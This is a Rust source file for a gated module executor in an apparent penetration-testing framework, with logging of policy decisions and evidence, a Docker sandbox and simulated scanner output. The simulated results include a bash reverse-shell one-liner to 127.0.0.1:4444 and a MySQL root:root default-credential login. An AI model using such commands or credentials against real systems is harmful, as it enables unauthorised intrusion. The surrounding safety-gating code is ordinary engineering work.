use tracing::info;

use crate::core::module::{LoadedModule, ModuleError, ModuleResult};
use crate::core::safety::{
    is_destructive, make_config_policy, now_secs, Charter, ConfigPolicy, DecisionRecord, Evidence,
    MemoryEntry, MemoryKind, PolicyContext, PolicyEngine, PolicySet, Preflight, PreflightError,
    ReasoningTrace, RiskLevel, ScopeManager,
};

const MAX_DECISIONS: usize = 1000;
const MAX_EVIDENCE: usize = 2000;
const MAX_TRACES: usize = 1000;
const MAX_MEMORIES: usize = 1000;

#[derive(Debug, thiserror::Error)]
pub enum ExecutorError {
    #[error(transparent)]
    Preflight(#[from] PreflightError),
    #[error(transparent)]
    Module(#[from] ModuleError),
}

/// Runs modules after enforcing charter / scope / risk / destructive gates.
#[derive(Debug)]
pub struct ModuleExecutor {
    pub charter: Charter,
    pub scope: ScopeManager,
    pub max_risk: RiskLevel,
    pub policy_set: PolicySet,
    pub decisions: Vec<DecisionRecord>,
    pub evidence: Vec<Evidence>,
    pub traces: Vec<ReasoningTrace>,
    pub memories: Vec<MemoryEntry>,
}

impl ModuleExecutor {
    pub fn new(charter: Charter, scope: ScopeManager, max_risk: RiskLevel) -> Self {
        ModuleExecutor {
            charter,
            scope,
            max_risk,
            policy_set: PolicySet::default(),
            decisions: Vec::new(),
            evidence: Vec::new(),
            traces: Vec::new(),
            memories: Vec::new(),
        }
    }

    pub fn policy(&self, context: PolicyContext) -> ConfigPolicy {
        make_config_policy(self.max_risk, context, &self.policy_set)
    }

    pub fn recent_traces(&self, n: usize) -> Vec<ReasoningTrace> {
        let end = self.traces.len();
        let start = end.saturating_sub(n);
        self.traces[start..].to_vec()
    }

    pub fn recent_memories(&self, n: usize) -> Vec<MemoryEntry> {
        let end = self.memories.len();
        let start = end.saturating_sub(n);
        self.memories[start..].to_vec()
    }

    /// Record a planner memory for later context (facts, decisions, failures).
    pub fn remember(&mut self, kind: MemoryKind, text: impl Into<String>) {
        self.memories.push(MemoryEntry {
            at: now_secs(),
            kind,
            text: text.into(),
        });
        let overflow = self.memories.len().saturating_sub(MAX_MEMORIES);
        if overflow > 0 {
            self.memories.drain(..overflow);
        }
    }

    pub fn record_trace(&mut self, trace: ReasoningTrace) {
        self.traces.push(trace);
        let overflow = self.traces.len().saturating_sub(MAX_TRACES);
        if overflow > 0 {
            self.traces.drain(..overflow);
        }
    }

    pub fn recent_decisions(&self, n: usize) -> Vec<DecisionRecord> {
        let end = self.decisions.len();
        let start = end.saturating_sub(n);
        self.decisions[start..].to_vec()
    }

    pub fn recent_evidence(&self, n: usize) -> Vec<Evidence> {
        let end = self.evidence.len();
        let start = end.saturating_sub(n);
        self.evidence[start..].to_vec()
    }

    /// Pre-computes the preflight report without enforcing, so callers can
    /// inspect *why* a run would be blocked before triggering it.
    pub fn preflight(
        &self,
        loaded: &LoadedModule,
        target: &str,
        destructive_override: Option<bool>,
        approved: bool,
        context: PolicyContext,
    ) -> Preflight {
        let base = RiskLevel::from_kind(loaded.info.kind);
        let cap_impact = loaded
            .info
            .capabilities
            .iter()
            .map(|c| c.impact())
            .max()
            .unwrap_or(base);
        let risk = loaded.info.impact.unwrap_or_else(|| base.max(cap_impact));
        let destructive = destructive_override.unwrap_or_else(|| {
            is_destructive(&loaded.info.name)
                || is_destructive(&loaded.info.description)
                || is_destructive(loaded.info.kind.as_str())
        });
        Preflight {
            target: target.to_string(),
            charter_accepted: self.charter.accepted,
            in_scope: self.scope.is_in_scope(target),
            risk,
            destructive,
            approved,
            capabilities: loaded.info.capabilities.clone(),
            intents: loaded.info.effective_intents(),
            context,
        }
    }

    #[allow(clippy::too_many_arguments)]
    pub async fn execute(
        &mut self,
        loaded: &LoadedModule,
        target: &str,
        destructive_override: Option<bool>,
        approved: bool,
        context: PolicyContext,
        job_id: Option<u64>,
        sandbox: bool,
    ) -> Result<ModuleResult, ExecutorError> {
        let pf = self.preflight(loaded, target, destructive_override, approved, context);
        let policy = self.policy(context);
        let decision = if sandbox {
            crate::core::safety::PolicyDecision::Allow
        } else {
            policy.evaluate(&pf.to_request())
        };
        self.record_decision(&loaded.info.name, &pf, &decision);
        if !sandbox {
            pf.check(&policy)?;
        }
        info!(
            target = %target,
            module = %loaded.info.name,
            risk = %pf.risk.as_str(),
            destructive = pf.destructive,
            sandbox = sandbox,
            "executor: preflight passed"
        );
        let result = if sandbox {
            self.run_sandboxed(&loaded.info, target).await
        } else {
            loaded.module.run().await?
        };
        self.record_evidence(&loaded.info.name, target, &result, job_id);
        Ok(result)
    }

    fn record_decision(
        &mut self,
        module: &str,
        pf: &Preflight,
        decision: &crate::core::safety::PolicyDecision,
    ) {
        self.decisions.push(DecisionRecord {
            at: now_secs(),
            target: pf.target.clone(),
            module: module.to_string(),
            capabilities: pf.capabilities.clone(),
            intents: pf.intents.clone(),
            impact: pf.risk,
            context: pf.context,
            decision: decision.clone(),
        });
        let overflow = self.decisions.len().saturating_sub(MAX_DECISIONS);
        if overflow > 0 {
            self.decisions.drain(..overflow);
        }
    }

    fn record_evidence(
        &mut self,
        module: &str,
        target: &str,
        result: &ModuleResult,
        job_id: Option<u64>,
    ) {
        let seq_start = self.evidence.len();
        for (i, content) in result.evidence.iter().enumerate() {
            self.evidence.push(Evidence::new(
                module,
                target,
                content,
                job_id,
                seq_start + i,
            ));
        }
        let overflow = self.evidence.len().saturating_sub(MAX_EVIDENCE);
        if overflow > 0 {
            self.evidence.drain(..overflow);
        }
    }
    async fn run_sandboxed(
        &self,
        info: &crate::core::module::ModuleInfo,
        target: &str,
    ) -> ModuleResult {
        use crate::core::sandbox::Sandbox;
        match Sandbox::freeze(target, "alpine:3.20").await {
            Ok(sandbox) => {
                info!(
                    container = %sandbox.container_id(),
                    "[SANDBOX] Docker container frozen"
                );
                let mut result = self.run_simulated(info, target);
                let logs = sandbox.capture_logs().await;
                result.evidence.extend(logs);
                result.evidence.push(format!(
                    "[SANDBOX] Container melted: {}",
                    sandbox.container_id()
                ));
                if let Err(e) = sandbox.melt().await {
                    result
                        .evidence
                        .push(format!("[SANDBOX] Teardown warning: {e}"));
                }
                result
            }
            Err(_) => {
                info!("[SANDBOX] Docker unavailable, falling back to simulation");
                self.run_simulated(info, target)
            }
        }
    }

    fn run_simulated(&self, info: &crate::core::module::ModuleInfo, target: &str) -> ModuleResult {
        let mut evidence = Vec::new();
        evidence.push(format!(
            "[SANDBOX] Initializing simulated environment for {}",
            info.name
        ));
        evidence.push(format!("[SANDBOX] Targeting simulated clone of {}", target));
        let (finding, data) = match info.name.as_str() {
            "arp_scanner" => {
                evidence.push("[SANDBOX] Scanning simulated subnet...".to_string());
                evidence.push(format!("[SANDBOX] Found live host: {target}"));
                evidence.push("[SANDBOX] Found live host: 127.0.0.1".to_string());
                (
                    Some("Found 2 live hosts".to_string()),
                    serde_json::json!({
                        "hosts": [target, "127.0.0.1"]
                    }),
                )
            }
            "mysql_scanner" => {
                evidence.push("[SANDBOX] Probing port 3306...".to_string());
                evidence.push("[SANDBOX] Detected MySQL v8.0.25 (Ubuntu)".to_string());
                evidence.push("[SANDBOX] Attempting default credentials...".to_string());
                evidence.push("[SANDBOX] SUCCESS: root:root login works".to_string());
                (
                    Some("MySQL default credentials root:root work".to_string()),
                    serde_json::json!({
                        "port": 3306,
                        "version": "8.0.25",
                        "vulnerable": true,
                        "credentials": { "username": "root", "password": "root" }
                    }),
                )
            }
            "vuln_scanner" => {
                evidence.push("[SANDBOX] Scanning package dependencies...".to_string());
                evidence.push("[SANDBOX] Detected vulnerable package: pyo3 v0.20.0".to_string());
                evidence
                    .push("[SANDBOX] Match found in OSV database: GHSA-pg25-x463-m587".to_string());
                (
                    Some("pyo3 v0.20.0 is vulnerable".to_string()),
                    serde_json::json!({
                        "vulnerabilities": [{
                            "id": "GHSA-pg25-x463-m587",
                            "package": "pyo3",
                            "version": "0.20.0",
                            "severity": "high",
                            "cvss": 7.5
                        }]
                    }),
                )
            }
            "reverse_shell_payload" => {
                evidence
                    .push("[SANDBOX] Generating simulated reverse shell payloads...".to_string());
                (
                    Some("Reverse shell payloads generated".to_string()),
                    serde_json::json!({
                        "bash": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
                        "python": "import socket..."
                    }),
                )
            }
            _ => {
                evidence.push(format!(
                    "[SANDBOX] Running generic simulation for {} on {}",
                    info.name, target
                ));
                (
                    Some(format!("Simulation completed for {}", info.name)),
                    serde_json::json!({
                        "simulation": true,
                        "module": info.name,
                        "target": target
                    }),
                )
            }
        };

        evidence.push("[SANDBOX] Simulation complete. Melting disposable state.".to_string());

        ModuleResult {
            success: true,
            finding,
            evidence,
            error: None,
            session_id: if info.name == "reverse_shell_payload" {
                Some("session:sandbox-1".to_string())
            } else {
                None
            },
            data,
        }
    }
}
